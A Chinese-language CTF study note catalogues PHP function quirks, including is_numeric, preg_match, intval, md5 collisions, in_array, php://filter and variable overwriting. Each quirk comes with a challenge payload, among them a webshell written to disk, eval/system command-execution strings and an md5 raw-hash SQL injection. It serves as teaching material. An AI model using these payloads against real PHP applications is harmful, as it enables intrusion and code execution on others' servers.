> Author:Y4tacker
>
> Last_Updated_Time:2020/10/16

# 函数

## is_numeric

这个函数就不必多说了，好吧懂英语你就懂了！！！

来个简单的测试

```php
for ($i=0; $i <128 ; $i++) { 
    $x=chr($i).'1';
   if(is_numeric($x)==true){
        echo urlencode(chr($i))."\n";
   }
}
```

发现下面这些都是测试通过的字符

> %09---水平定位符号
>
> %0A---换行键
> %0B---垂直定位符号
> %0C---换页键
> %0D---归位键
> %2B---就是加号
>
> %20---空格
>
> \-
>
> \+
>
> \.

但是这个不是重点，重点是配合其他函数搞事情，下面这个例子trim就是一个很好的例子

## trim与is_numeric

首先搬运工搬运一下官网的介绍

```php
语法
trim(string,charlist)

参数	描述
string	        必需。规定要检查的字符串。
charlist	    可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：

"\0"       - NULL
"\t"       - 制表符
"\n"       - 换行
"\x0B"     - 垂直制表符
"\r"       - 回车
" "        - 空格

```

并且如果你想知道有哪些也可以运行看看

```php
for ($i=0; $i <=128 ; $i++) { 
    $x=chr($i).'1';
   if(trim($x)!=='1' &&  is_numeric($x)){
        echo urlencode(chr($i))."\n";
   }
}
发现除了+-.号以外还有只剩下%0c也就是换页符了
```

来看一道ctf题目

```php
function filter($num){
    $num=str_replace("0x","1",$num);
    $num=str_replace("0","1",$num);
    $num=str_replace(".","1",$num);
    $num=str_replace("e","1",$num);
    $num=str_replace("+","1",$num);
    return $num;
}
$num=$_GET['num'];
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){
    if($num=='36'){
        echo $flag;
    }else{
        echo "hacker!!";
    }
}else{
    echo "hacker!!!";
}
```

> payload:num=%0c36

## preg_match

### 数组绕过正则表达式

```php
if(preg_match("/[0-9]/", $num)){
        die("no no no!");
}
```

官方文档中介绍如下：

```php
preg_match()返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次
```

所以如果我们不按规定传一个字符串，而是数组的话，就会返回false，从而不会进入if，达到绕过的效果。

> ```php
> payload:num[]=1
> ```

### 正则表达式修饰符

首先说明下几个常见的模式：

```php
\i 
不区分(ignore)大小写

\m
多(more)行匹配
若存在换行\n并且有开始^或结束$符的情况下，
将以换行为分隔符，逐行进行匹配
$str = "abc\nabc";
$preg = "/^abc$/m";
preg_match($preg, $str,$matchs);
这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。

\s
特殊字符圆点 . 中包含换行符
默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符
$str = "abggab\nacbs";
$preg = "/b./s";
preg_match_all($preg, $str,$matchs);
这样匹配到的有三个 bg b\n bs

\A
强制从目标字符串开头匹配;

\D
如果使用$限制结尾字符,则不允许结尾有换行; 

\e
配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; 所以可以进行rce
```

我们来分析下嘛这一道题

```php
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
```



> payload:cmd=%0aphp

%0aphp 经过第一个匹配时，以换行符为分割也就是%0a，前面因为是空的，所以只匹配换行符后面的，所以可以通过。
经过第二个正则表达式时，因为我们是%0aphp 不符合正则表达式的以php开头以php结尾。所以无法通过，最后输出flag

## Int_val

官方文档介绍如下：

> intval ( mixed $var [, int $base = 10 ] ) : int
>
> Note:
> 如果 base 是 0，通过检测 var 的格式来决定使用的进制：
> 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，
> 如果字符串以 "0" 开始，使用 8 进制(octal)；否则，
> 将使用 10 进制 (decimal)。

也可以使用科学计数法

> intval('4476.0')===4476    小数点  
> intval('+4476.0')===4476   正负号
> intval('4476e0')===4476    科学计数法
> intval('0x117c')===4476    16进制
> intval('010574')===4476    8进制
> intval(' 010574')===4476   8进制+空格

下面这道题就可以使用上面的payload执行：

```php
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}

```

## Hash比较缺陷

### md5处理数组

```php
if (isset($_POST['a']) and isset($_POST['b'])) {
		if ($_POST['a'] != $_POST['b'])
				if (md5($_POST['a']) === md5($_POST['b']))
						echo $flag;
}
```

原因：md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是强相等的。

### Sha1处理数组

和上面一样的，可以使用数组绕过，这里更多是记录一下弱比较时可用的字符串

```php
aaroZmOk
aaK1STfY
aaO8zKZF
aa3OFF9m
```



## md5

### md5弱比较(==比较漏洞)

> 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。
>
> 下列的字符串的MD5值都是0e开头的：
>
> QNKCDZO
>
> 240610708
>
> s878926199a
>
> s155964671a
>
> s214587387a
>
> s214587387a

这里再分享一篇我以前记录的WP：[记录以后可能用到的MD5](https://blog.csdn.net/solitudi/article/details/107633504?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160490116219724839216341%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160490116219724839216341&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-4-107633504.pc_v2_rank_blog_default&utm_term=md&spm=1018.2118.3001.4450)

这里再补充一道题

```php
$a=(string)$a;
$b=(string)$b;
if(  ($a!==$b) && (md5($a)==md5($b)) ){
echo $flag;
}
md5弱比较，为0e开头的会被识别为科学记数法，结果均为0，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可。
payload: a=QNKCDZO&b=240610708
```

### md5强碰撞

```php
$a=(string)$a;
$b=(string)$b;
if(  ($a!==$b) && (md5($a)===md5($b)) ){
echo $flag;
}
这时候需要找到两个真正的md5值相同数据
a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
  b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2

```

国外有个网站也有一些收集的资料：[md5强碰撞收集](https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value)

### md5($str,true)类型绕过

```php
$sql="select * from user where username ='admin' and password ='".md5($password,true)."'";
```

```
将密码转换成16进制的hex值以后，再将其转换成字符串后包含’ ‘or ’ 6’

SELECT * FROM admin WHERE pass=’ ‘or ’ 6’

很明显可以注入了。

难点就在如何寻找这样的字符串，网上有
提供两个字符串： ffifdyop、129581926211651571912466741651878684928
但题目有长度限制，所以输入ffifdyop即可获取flag

再转成字符串:’ ’ ‘or’ 6

解析:存在 or 即代码的两边有一边为真既可以绕过，其实为垃圾代码没有任何用的。

or 后面有6，非零值即为真。既可以成功绕过。
```



## In_array中的弱类型比较

ctf-show中的一道题

```php
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}
```

查看这样一个结果：

```php
$allow = array(1,'2','3');
var_dump(in_array('1.php',$allow));//返回true

$allow = array('1','2','3');
var_dump(in_array('1.php',$allow));//返回false
```

in_array延用了php中的==，因为新加进去的随机数字每次都包含1，1存在的几率是最大的。
 payload：`n=1.php post:content=<?php eval($_POST[1]);?>`

官方文档：[PHP 类型比较表](https://www.php.net/manual/zh/types.comparisons.php)

## parse_str

官方文档的介绍

```php
parse_str — 将字符串解析成多个变量

parse_str ( string $encoded_string [, array &$result ] ) : void

如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代。
```

那么有这样一个例子,简简单单看一看就好了

```php
$a='q=123&p=456';
parse_str($a,$b);
echo $b['q'];   //输出123
echo $b['p'];   //输出456
```

为了加深影响这里再补充一个简简单单的web题目

```php
if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
       parse_str($v1,$v2);
       if($v2['flag']==md5($v3)){
           echo $flag;
       }
}
//所以这个题我们传入v1=1 然后v3=flag=c4ca4238a0b923820dcc509a6f75849b 即1的md5值即可
```

## ereg---%00正则截断

没啥特别好讲解的，从一道web题目当中开启学习吧

```php
if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');

}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){
    echo $flag;
}
//补充函数
//strrev()  字符串反转
//intval()  获取变量的整数值
//本题payload：c=a%00778
//备注：首先正则表达式只会匹配%00之前的内容，后面的被截断掉，可以通过正则表达式检测，后面通过反转成877%00a，再用intval函数获取整数部分得到877，877为0x36d的10进制。
```



## is_file

### php伪协议绕过is_file+highlight_file

从一道ctf题目学习

```php
function filter($file){
    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){
        die("hacker!");
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

函数介绍：

```php
is_file — 判断给定文件名是否为一个正常的文件
is_file ( string $filename ) : bool
```

部分payload：

```php
可以直接用不带任何过滤器的filter伪协议
payload:file=php://filter/resource=flag.php
也可以用一些没有过滤掉的编码方式和转换方式
payload:file=php://filter/read=convert.quoted-printable-encode/resource=flag.php
file=compress.zlib://flag.php
payload:file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php
```

[PHP支持的字符编码](https://www.php.net/manual/zh/mbstring.supported-encodings.php)

如果还过滤了`filter`协议怎么办呢，看下一个

### 多次重复/proc/self/root绕过is_file

```php
function filter($file){
    if(preg_match('/\.\.\/|http|filter|https|data|input|rot13|base64|string/i',$file)){
        die("hacker!");
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```



```
file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

还有一个野蛮人笔记

[php源码分析 require_once 绕过不能重复包含文件的限制](https://www.anquanke.com/post/id/213235)

# php变量名如何非法字符

我们知道php变量命名是不允许使用点号的，但是用了点怎么半呢，看看下面的例子吧

先来看下面的例子

当我们POST`yyy.yyy=1`的时候被解析为`["yyy_yyy"]=> string(1) "1" `

无论后面加多少个`.yyy`它都会被解析为`_`，但是`yyy[yyy.yyy=1`被解析为`yyy_yyy.yyy`

这个`yyy[yyy[yyy=1`为`yyy_yyy[yyy`具体原理不清楚，没读过php源代码

# $_SERVER['argv']的骚操作

1、cli模式（命令行）下

```php
第一个参数$_SERVER['argv'][0]是脚本名，其余的是传递给脚本的参数
```

2、web网页模式下

```php
在web页模式下必须在php.ini开启register_argc_argv配置项

设置register_argc_argv = On(默认是Off)

这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]

$argv,$argc在web模式下不适用
```
> CLI模式下直接把 request info ⾥⾯的argv值复制到arr数组中去
> 继续判断query string是否为空，
> 如果不为空把通过+符号分割的字符串转换成php内部的zend_string，
> 然后再把这个zend_string复制到 arr 数组中去。

因此加号+分割argv成多个部分

这里做个测试

```php
<?php
$a=$_SERVER['argv'];
var_dump($a);
http://localhost:63342/myphptest/mytest.php?_ijt=kbaatem1e97lqblmkrg3lvk83g&a=1+yyy=3
得到结果
array(2) { [0]=> string(35) "_ijt=kbaatem1e97lqblmkrg3lvk83g&a=1" [1]=> string(5) "yyy=3" }
```



# 变量覆盖

还是从一道题当中讲解,代码审计，题目一共有三个变量 `$error $suces $flag`我们只要令其中任意一个的值为flag，都是可以通过die或者直接echo输出的。假设`$flag=flag{test123}`

```php
$error='error!';
$suces='success!';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);

```

一、通过die($error)输出

```
`payload:a=flag post: error=a`
```

此时`$a=flag{test123};$error=flag{test123};`从而输出error也就是输出flag

二、通过die($suces)

```
payload:suces=flag&flag=
```

此时`$scues=flag{test123};$_POST['flag']=NULL;$flag=NULL`，满足`($_POST['flag']==$flag)`

# 补充一些其他神奇姿势

## 路径问题

```php
if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }
}
```

> Payload：
>
> 下面方式在highlight_file中均等效于flag.php，也即本题的payload
>
> /var/www/html/flag.php              绝对路径
> ./flag.php                          相对路径
> php://filter/resource=flag.php      php伪协议             





## 三目运算符与变量覆盖

首先看看下面这样一个代码：

```php
$_GET?$_GET=&$_POST:'flag';
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
```

根据第一条可知，如果get传了一个值，那么就可以用post覆盖get中的值。
中间两行意义不大。
最后一行是,如果get传了一个`HTTP_FLAG=flag`就输出`flag`否则显示`index.php`源码。
所以我们`get`随便传一个，然后`post`传` HTTP_FLAG=flag`即可

```
`payload get：1=1 post：HTTP_FLAG=flag`
```



## and与&&的区别+反射类ReflectionClass的使用

```php
$getflag = new getflag();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('getflag')$v3");
        }
    }    
}
```

其实主要还是通过这道题学习了php的反射以及and的一些小特性

下面首先是讲`and与$$`,所以只需要保证第一个为`true`即可

```php
<?php
$a=true and false and false;
var_dump($a);  //返回true
$a=true && false && false;
var_dump($a);  //返回false
```

下面来简单了解一下反射的相关定义与函数，感觉[官方文档](https://www.php.net/manual/zh/class.reflectionclass.php)很详细,自己点开学习一下即可

所以得到`payload:?v1=1&v2=echo new ReflectionClass&v3=;`

其实还有很多种方法，因为过滤比较少，比如`v1=1&v2=?><?php echo `ls`?>/*&v3=;*/`，或者来个include加伪协议绕过也行

## and优先级

```php
$a = true and false;
var_dump(true and false);
var_dump($a);
最后输出的结果居然是：！！！
bool(false)：：相当于是($a = true) and false;
bool(true)
```

附上：[运算符优先级](https://www.php.net/manual/zh/language.operators.precedence.php)

## php 异常类

还是从ctfshow当中一道题学习

```php
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");
    }

}
```

先来看下这个正则表达式`/[a-zA-Z]+/` 匹配**至少有一个字母**的字符串
所以我们只要让new后面有个类不报错以后，就可以随意构造了。我们随便找个php中的内置类并且可以直接echo输出的就可以了。
举两个例子

```php
Exception
ReflectionClass
```

答案举例

```php
payload:
v1=Exception();system('tac f*');//&v2=a
v1=ReflectionClass&v2=system('tac f*')
```

## FilesystemIterator类的使用

有时候我们就可以利用这个函数遍历当前目录或者看情况其他目录

```php
<?php
$a = new FilesystemIterator("../../");
while ($a->valid()){ //判断是否到底
    echo $a->getFilename().'\n';
    $a->next();
}
配合下面函数
getcwd()
getcwd — 取得当前工作目录
getcwd(void):string
```

## DirectoryIterator类与glob协议遍历目录

通常可以配合RCE使用

```
<?php
	$a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{echo($f->__toString().' ');
}
exit(0);
?>
```

## 超全局变量$GLOBALS

首先简单介绍一下超全局变量

> $GLOBALS — 引用全局作用域中可用的全部变量
> 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。

还是从一道网上ctf题目进行记录

```php
function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}

if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    
    if(preg_match('/ctf/', $v1)){
            getFlag($v1,$v2);
    }
    
}
```

看到一堆过滤的头大，但是看到`getFlag`函数当中有两个`$$`，所以对于该题，只要把$GLOBALS赋值给v2，然后v2再赋值给v1,即可将全部变量输出

```
payload：
v1=ctf&v2=GLOBALS
```

## php://filter的一些常见配合编码

> payload:
> file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php
> post:contents=?<hp pvela$(P_SO[T]1;)>?
>
> 这种是将字符两位两位进行交换